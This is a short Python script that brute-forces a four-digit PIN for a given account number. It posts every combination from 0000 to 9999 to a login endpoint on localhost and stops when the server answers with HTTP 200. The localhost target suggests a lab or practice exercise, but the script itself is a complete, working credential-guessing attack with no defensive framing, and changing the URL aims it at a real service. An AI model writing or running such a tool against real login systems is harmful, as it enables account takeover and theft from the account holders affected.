import requests
import argparse

parser = argparse.ArgumentParser(description='Brute-force a 4-digit PIN for a known account number.')
parser.add_argument('account_number', type=str, help='The known account number to use for brute-forcing the PIN.')

args = parser.parse_args()

url = "http://localhost:5000/login" 

account_number = args.account_number

for pin in range(10000):
    pin_str = f"{pin:04d}"
    
    data = {
        "number": account_number,
        "pin": pin_str
    }
    
    response = requests.post(url, json=data)

    print(f"Attempt {pin_str}: {response.status_code} - {response.json()}")
    
    if response.status_code == 200:
        print(f"Success! The correct PIN is: {pin_str}")
        break
